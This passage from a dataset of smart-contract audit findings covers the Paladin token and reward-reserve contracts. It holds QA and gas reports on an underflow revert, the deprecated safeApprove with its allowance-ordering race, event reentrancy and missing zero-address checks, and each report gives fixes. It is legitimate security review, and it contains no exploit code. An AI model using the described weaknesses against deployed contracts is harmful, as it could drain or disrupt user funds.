724](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L724) would not be called.\n\nThis leads to a revert caused by underflow on [line 729](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L729)\n\nThis is an exceedingly rare bug and unlikely to happen because\n\n- it is the admin that calls function `setEndDropPerSecond`.\n- it can only occur when `block.timestamp == startDropTimestamp + dropDecreaseDuration`. Reverts will not occur at any subsequent timestamp.\n\n### Proof of Concept\n\nNevertheless, I have constructed a proof of concept of this bug by adding a\nnew function in my fork of the repo [here](https://github.com/sseefried/codearena-paladin-2022-03/blob/3456ce6013f4bd7f5660d90807ea48d771520033/contracts/HolyPaladinToken.sol#L1441-L1445) and writing a test which exercises the bug [here](https://github.com/sseefried/codearena-paladin-2022-03/blob/3456ce6013f4bd7f5660d90807ea48d771520033/test/noValidationOfConstructorParametersBugs.ts#L120).\n\n### Recommended Mitigation Steps\n\nAdd the following `require` declaration to `function setEndDropPerSecond`\n\n```solidity\nrequire(newEndDropPerSecond <= startDropPerSecond, \"newEndDropPerSecond > startDropPerSecond\");\n```\n\n## Low: Don't use safeApprove in `PaladinRewardReserve` contract\n\n### Impact\n\nThere are multiple uses of `safeApprove` in `PaladinRewardReserve.sol`. It has similar issues to `approve` where careful transaction ordering by an attacker could lead to uses of the old and the new allowance.\n\nOpenZeppelin have _deprecated_ this function [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/2bd75a44bb5f419d132bdca6f1bf483d1479f550/contracts/token/ERC20/utils/SafeERC20.sol#L38-L58). A deeper discussion of the issue can be found in this [GitHub Issue](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219).\n\n### Proof of Concept\n\nUses of `safeApprove` appear in function [setNewSpender](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L31), [updateSpenderAllowance](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L38-L39) and [removeSpender](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L47).\n\nHowever, it is **only** its use in function `updateSpenderAllowance` where it is problematic.\n\n### Tools Used\nManual inspection\n\n### Recommended Mitigation Steps\n\nThe general advice given by Open Zeppelin is to use calls to `safeIncreaseAllowance` or `safeDecreaseAllowance` instead. In the case of function `updateSpenderAllowance` one would need to determine whether the allowance was being increased or decreased by first calling IERC20's `allowance` function and comparing the result to the `amount` parameter\n\n## Non-critical: typos\n\n- [line 59](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L59). \"tranking\" -> \"tracking\"\n- [line 802](avaialable). \"avaialable\" -> \"available\"\n- [line 1081](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1081). \"Check if user in inside the allowed period base on its cooldown\" -> \"Check if user is inside the allowed period based on its cooldown\"\n- [line 1323](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1323).\n \"chekpoint\" -> \"checkpoint\"",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/80"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "##### GAS\n\n### Gas#1: Unnecessary on-chain computations to find the reward multiplier based on the user lock duration.\n\n[L1155-1160](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1155-L1160)\n[L1210-1217](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1210-L1217)\n\n```\n// find the reward multiplier based on the user lock duration\nuint256 durationRatio = ((duration - MIN_LOCK_DURATION) * UNIT) / (MAX_LOCK_DURATION - MIN_LOCK_DURATION);\nuint256 userLockBonusRatio = minLockBonusRatio + (((maxLockBonusRatio - minLockBonusRatio) * durationRatio) / UNIT);\n\nuserCurrentBonusRatio[user] = userLockBonusRatio;\nuserBonusRatioDecrease[user] = (userLockBonusRatio - baseLockBonusRatio) / duration;\n\n```\n\nThere is no need to peform this calculation twice as the value of the parameters dont change from one calculation to the other.\n\nI recommend caching the calculation for `userLockBonusRatio` and `durationRatio` to be used when/if `userCurrentBonusRatio[user]` or `userBonusRatioDecrease[user]` need to be updated.\n\nFor example, the `if` statement would look something like:\n\n```\nif (action != LockAction.INCREASE_AMOUNT) {\n    userCurrentBonusRatio[user] = userLockBonusRatio;\n    userBonusRatioDecrease[user] =\n        (userLockBonusRatio - baseLockBonusRatio) /\n        duration;\n}\n```\n\n### Gas#2: Assignment of state variable to default.\n\nPlease change [emergency = false](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L103) to:\n\n```\n bool public emergency;\n```\n\n### Gas#3: Redundant `require` function.\n\n[admin](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L183)\n\n`transferOwnership` already has a zero address check for `_admin`, making the above require function redundant.\n\n```\nrequire(_admin != address(0));\n\npal = IERC20(palToken);\n\ntransferOwnership(_admin);\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/79"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low Risk Issues\n\n### `PaladinRewardReserve`'s approvals break if the same contract is in charge of two tokens (e.g. a [PalPool](https://doc.paladin.vote/paladin-protocol/palpool))\nThe `approvedSpenders` mapping only takes in a spender, rather than both a spender and a token. Approval for one token means approval for all tokens the account controls. Removal for one means removal for all.\n\n1. File: contracts/PaladinRewardReserve.sol (lines [28-31](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L28-L31))\n```solidity\n    function setNewSpender(address token, address spender, uint256 amount) external onlyOwner {\n        require(!approvedSpenders[spender], \"Already Spender\");\n        approvedSpenders[spender] = true;\n        IERC20(token).safeApprove(spender, amount);\n```\n2. File: contracts/PaladinRewardReserve.sol (lines [36-37](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L36-L37))\n```solidity\n    function updateSpenderAllowance(address token, address spender, uint256 amount) external onlyOwner {\n        require(approvedSpenders[spender], \"Not approved Spender\");\n```\n3. File: contracts/PaladinRewardReserve.sol (lines [44-46](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L44-L46))\n```solidity\n    function removeSpender(address token, address spender) external onlyOwner {\n        require(approvedSpenders[spender], \"Not approved Spender\");\n        approvedSpenders[spender] = false;\n```\n\n\n## Non-critical Issues\n\n\n### `require()`/`revert()` statements should have descriptive reason strings\n\n1. File: contracts/HolyPaladinToken.sol (line [182](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L182))\n```solidity\n        require(palToken != address(0));\n```\n2. File: contracts/HolyPaladinToken.sol (line [183](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L183))\n```solidity\n        require(_admin != address(0));\n```\n3. File: contracts/HolyPaladinToken.sol (line [1138](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1138))\n```solidity\n        require(user != address(0)); //Never supposed to happen, but security check\n```\n4. File: contracts/HolyPaladinToken.sol (line [1236](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1236))\n```solidity\n        require(user != address(0)); //Never supposed to happen, but security check\n```\n\n### `constant`s should be defined rather than using magic numbers\n\n1. File: contracts/HolyPaladinToken.sol (line [1417](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1417))\n```solidity\n        if(newKickRatioPerWeek == 0 || newKickRatioPerWeek > 5000) revert IncorrectParameters();\n```\n\n### The `nonReentrant` `modifier` should occur before all other modifiers\nThis is a best-practice to protect against reentrancy in other modifiers\n\n1. File: contracts/PaladinRewardReserve.sol (line [52](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L52))\n```solidity\n    function transferToken(address token, address receiver, uint256 amount) external onlyOwner nonReentrant {\n```\n\n### `safeApprove()` is deprecated\n[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`\n\n1. File: contracts/PaladinRewardReserve.sol (line [31](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L31))\n```solidity\n        IERC20(token).safeApprove(spender, amount);\n```\n2. File: contracts/PaladinRewardReserve.sol (line [38](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L38))\n```solidity\n        IERC20(token).safeApprove(spender, 0);\n```\n3. File: contracts/PaladinRewardReserve.sol (line [39](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L39))\n```solidity\n        IERC20(token).safeApprove(spender, amount);\n```\n4. File: contracts/PaladinRewardReserve.sol (line [47](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L47))\n```solidity\n        IERC20(token).safeApprove(spender, 0);\n```\n\n### Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate\n\n1. File: contracts/HolyPaladinToken.sol (lines [88-94](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L88-L94))\n```solidity\n    mapping(address => address) public delegates;\n\n    /** @notice List of Vote checkpoints for each user  */\n    mapping(address => Checkpoint[]) public checkpoints;\n\n    /** @notice List of Delegate checkpoints for each user  */\n    mapping(address => DelegateCheckpoint[]) public delegateCheckpoints;\n```\n2. File: contracts/HolyPaladinToken.sol (lines [127-131](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L127-L131))\n```solidity\n    mapping(address => uint256) public userRewardIndex;\n    /** @notice Current amount of rewards claimable for the user  */\n    mapping(address => uint256) public claimableRewards;\n    /** @notice Timestamp of last update for user rewards  */\n    mapping(address => uint256) public rewardsLastUpdate;\n```\n3. File: contracts/HolyPaladinToken.sol (lines [141-143](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L141-L143))\n```solidity\n    mapping(address => uint256) public userCurrentBonusRatio;\n    /** @notice Value by which user Bonus Ratio decrease each second  */\n    mapping(address => uint256) public userBonusRatioDecrease;\n```\n\n### Non-library/interface files should use fixed compiler versions, not floating ones\n\n1. File: contracts/HolyPaladinToken.sol (line [2](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L2))\n```solidity\npragma solidity ^0.8.10;\n```\n2. File: contracts/PaladinRewardReserve.sol (line [2](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L2))\n```solidity\npragma solidity ^0.8.4;\n```\n\n### Use the same solidity version in all non-library/interface files\n\n1. File: contracts/HolyPaladinToken.sol (line [2](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L2))\n```solidity\npragma solidity ^0.8.10;\n```\n2. File: contracts/PaladinRewardReserve.sol (line [2](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L2))\n```solidity\npragma solidity ^0.8.4;\n```\n\n\n### Use native time units such as seconds, minutes, hours, days, weeks and years, rather than numbers of seconds\n1. File: contracts/HolyPaladinToken.sol (lines [17-39](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L17-L39))\n```solidity\n    uint256 public constant WEEK = 604800;\n    /** @notice Seconds in a Month */\n    uint256 public constant MONTH = 2629800;\n    /** @notice 1e18 scale */\n    uint256 public constant UNIT = 1e18;\n    /** @notice Max BPS value (100%) */\n    uint256 public constant MAX_BPS = 10000;\n    /** @notice Seconds in a Year */\n    uint256 public constant ONE_YEAR = 31557600;\n\n    /** @notice  Period to wait before unstaking tokens  */\n    uint256 public constant COOLDOWN_PERIOD = 864000; // 10 days\n    /** @notice  Duration of the unstaking period\n    After that period, unstaking cooldown is expired  */\n    uint256 public constant UNSTAKE_PERIOD = 432000; // 5 days\n\n    /** @notice Period to unlock/re-lock tokens without possibility of punishement   */\n    uint256 public constant UNLOCK_DELAY = 1209600; // 2 weeks\n\n    /** @notice Minimum duration of a Lock  */\n    uint256 public constant MIN_LOCK_DURATION = 7889400; // 3 months\n    /** @notice Maximum duration of a Lock  */\n    uint256 public constant MAX_LOCK_DURATION = 63115200; // 2 years\n```\n\n### Typos\n\n1. File: contracts/HolyPaladinToken.sol (line [33](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L33))\n```solidity\n    /** @notice Period to unlock/re-lock tokens without possibility of punishement   */\n```\npunishement\n\n2. File: contracts/HolyPaladinToken.sol (line [59](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L59))\n```solidity\n    /** @notice Struct trancking the total amount locked  */\n```\ntrancking\n\n3. File: contracts/HolyPaladinToken.sol (line [110](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L110))\n```solidity\n    /** @notice Timstamp of last update for global reward index  */\n```\nTimstamp\n\n4. File: contracts/HolyPaladinToken.sol (line [113](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L113))\n```solidity\n    /** @notice Amount of rewards distriubted per second at the start  */\n```\ndistriubted\n\n5. File: contracts/HolyPaladinToken.sol (line [239](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L239))\n```solidity\n     * @param amount amount ot withdraw\n```\not\n\n6. File: contracts/HolyPaladinToken.sol (line [258](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L258))\n```solidity\n            // If the user does not deelegate currently, automatically self-delegate\n```\ndeelegate\n\n7. File: contracts/HolyPaladinToken.sol (line [421](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L421))\n```solidity\n     * @param receiver address fo the receiver\n```\nfo\n\n8. File: contracts/HolyPaladinToken.sol (line [706](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L706))\n```solidity\n    // Find the user available balance (staked - locked) => the balance that can be transfered\n```\ntransfered\n\n9. File: contracts/HolyPaladinToken.sol (line [802](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L802))\n```solidity\n                // (using avaialable balance to count the locked balance with the multiplier later in this function)\n```\navaialable\n\n10. File: contracts/HolyPaladinToken.sol (line [840](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L840))\n```solidity\n                            // a ratio based on the rpevious one and the newly calculated one\n```\nrpevious\n\n11. File: contracts/HolyPaladinToken.sol (line [1323](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1323))\n```solidity\n        // update the the Delegate chekpoint for the delegatee\n```\nchekpoint\n\n12. File: contracts/PaladinRewardReserve.sol (line [19](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L19))\n```solidity\n    /** @notice Emitted when the allowance of a spander is updated */\n```\nspander\n\n\n### Event is missing `indexed` fields\nEach `event` should use three `indexed` fields if there are three or more fields\n\n1. File: contracts/HolyPaladinToken.sol (line [151](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L151))\n```solidity\n    event Stake(address indexed user, uint256 amount);\n```\n2. File: contracts/HolyPaladinToken.sol (line [153](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L153))\n```solidity\n    event Unstake(address indexed user, uint256 amount);\n```\n3. File: contracts/HolyPaladinToken.sol (line [159](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L159))\n```solidity\n    event Unlock(address indexed user, uint256 amount, uint256 totalLocked);\n```\n4. File: contracts/HolyPaladinToken.sol (line [161](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L161))\n```solidity\n    event Kick(address indexed user, address indexed kicker, uint256 amount, uint256 penalty, uint256 totalLocked);\n```\n5. File: contracts/HolyPaladinToken.sol (line [163](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L163))\n```solidity\n    event ClaimRewards(address indexed user, uint256 amount);\n```\n6. File: contracts/HolyPaladinToken.sol (line [167](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L167))\n```solidity\n    event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);\n```\n7. File: contracts/HolyPaladinToken.sol (line [169](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L169))\n```solidity\n    event EmergencyUnstake(address indexed user, uint256 amount);\n```\n8. File: contracts/PaladinRewardReserve.sol (line [18](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L18))\n```solidity\n    event NewSpender(address indexed token, address indexed spender, uint256 amount);\n```\n9. File: contracts/PaladinRewardReserve.sol (line [20](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L20))\n```solidity\n    event UpdateSpender(address indexed token, address indexed spender, uint256 amount);\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/72"
    }
  },
  {
    "title": "QA Report",
    "body": "## Issue 1 (Low) - Missing 0 address check for immutable rewardsVault address\n\nIn the constructor for `HolyPaladinToken.sol`, the `rewardsVault` is set without requiring that the address not be 0. All other addresses in the constructor are properly verified. Moreover, `rewardsVault` is immutable, so the contract would need to be redeployed.\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L194\n\n## Issue 2 (Low) - Floating Pragma\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L2\n\nBoth files contain a floating pragma. It is recommended to specify a compiler version to reduce the risk of deploying contracts with different versions, potentially leading to compiler-specific bugs.\n\n## Issue 3 (Low) - Use of SafeApprove() deprecated\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L31\n\nOpenZeppelin has marked this function as deprecated and recommends using `safeIncreaseAllowance()`. See following comments:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/742e85be7c08dff21410ba4aa9c60f6a033befb8/contracts/token/ERC20/utils/SafeERC20.sol#L39-L43\n\n## Issue 4 (Non-critical) - Make the emergency logic a modifier\n\nRepeated emergency checks can be made a modifier to reduce code duplication.\n\nExample: https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L254",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/70"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. `!=0` more effective than `< 0`\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L229\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L385\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1078\n\nRecommended Mitigation Steps:\nChange `> 0` or `< 0` to `!= 0`\n\n========================================================================\n\n2. Can save gas by using `--` instead of `- 1`\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L515\n\nRecommended Mitigation Steps:\nChange to:\n```\n uint256 high = --nbCheckpoints;\n```\n\n========================================================================\n\n3. unnecessary value set. the default value of uint is zero.\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L516\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L796\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L807\n\nRecommended Mitigation Steps:\nremove 0\n\n========================================================================\n\n4. unnecessary value set. the default value of bool is false\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L103\n\nRecommended Mitigation Steps:\nremove false\n\n========================================================================\n\n5. more efficient gas usage by removing && operator\n\noof of Concept:\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1271\n\nRecommended Mitigation Steps:\n```\nrequire(user != address(0)):\nrequire(kicker != address(0), \"hPAL: Address Zero\");\n```\n\n========================================================================\n\n6. Using > is cheaper than >=\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1194-L1195\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1141-L1143\n\nRecommended Mitigation Steps:\nChange from `>=` to `>`\n\n========================================================================\n\n7. the best way to use `SafeERC20.function` for gas opt\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol#L12\n\nRecommended Mitigation Steps:\nby not declaring:\n```\nusing SafeERC20 for IERC20;\n```\n\nand use:\n```\nSafeERC20.safeTransfer(IERC20(token), receiver, amount);\n```\n\n========================================================================\n\n8. Using `calldata` to store struct data type can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L451\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L466\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L482\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L492\n\nRecommended Mitigation Steps:\nChange from `memory` to `calldata`\n\n========================================================================\n\n9. caching proof.length for loop can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/open-zeppelin/utils/MerkleProof.sol#L28\n\nRecommended Mitigation Steps:\n```\nuint256 saveLengt = proof.length\nfor (uint256 i; i < saveLengt; ++i)\n```\n\n========================================================================",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/68"
    }
  },
  {
    "title": "QA Report",
    "body": "# 1. Events reentrancy\n\n## Risk\nLow\n\n## Impact\nEmitting events for some functions does not follow checks-effects-interactions pattern which leads to events reentrancy vulnerability. Attacker might perform reentrancy attack that confuses off-chain applications that monitor state of the contracts via emitted events.\n\n## Proof of Concept\n\nHolyPaladinToken.sol\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L394-L396\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1070-L1072\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1372-L1374\n\nPaladinRewardReserve.sol\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L31-L33\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L39-L41\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L47-L49\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nIt is recommended to follow checks-effects-interactions pattern by firs emitting the event and then calling external contracts.\n\n# 2. Claim rewards missing synchronization\n## Risk\nLow\n\n## Impact\nContract `HolyPaladinToken.sol` uses `PaladinRewardReserve.sol` contract as a vault with the rewards. There is no synchronization/connection between the contracts in terms of the balances which means that `HolyPaladinToken.sol` might have `claimableRewards[user]` with the amount of rewards that should be sent to the user and `PaladinRewardReserve.sol` not holding enough rewards to pay the user.\n\nFunction `claim` is trying to send to user rewards from rewardsVault based on `claimableRewards[user]`, but that might fail if the rewardVault does not hold enough rewards.\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L380-L396\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nIt is recommended to connect user's reward distribution with the balance of reward tokens owned by `PaladinRewardReserver.sol` contract.\n\n# 3. Missing zero address checks\n\n## Risk\nLow\n\n## Impact\nMost of the functions in HolyPaladinToken.sol and PaladinRewardReserve.sol have zero address checks for setting state variables and using addresses for internal transaction logic, but there are also functions that are missing these checks. Setting some of the state variables to the zero address, whether intentional or not, can break the protocol functionality. Adding these checks consistently would prevent this scenario.\n\n## Proof of Concept\nHolyPaladinToken\n* Setter missing check for `_rewardsVault` address - https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L174\n* Setter missing check for `delegatee` address - https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L371\n\nPaladinRewardReserver.sol\n* Setter missing check for `_admin` address - https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L24\n* Setter missing checks for `token`, `spender` addresses - https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L28\n* Missing checks for `token`, `spender` addresses - https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L36\n* Missing check for `token`, `spender` addresses - https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L44\n* Missing check for `token`, `receiver` addresses - 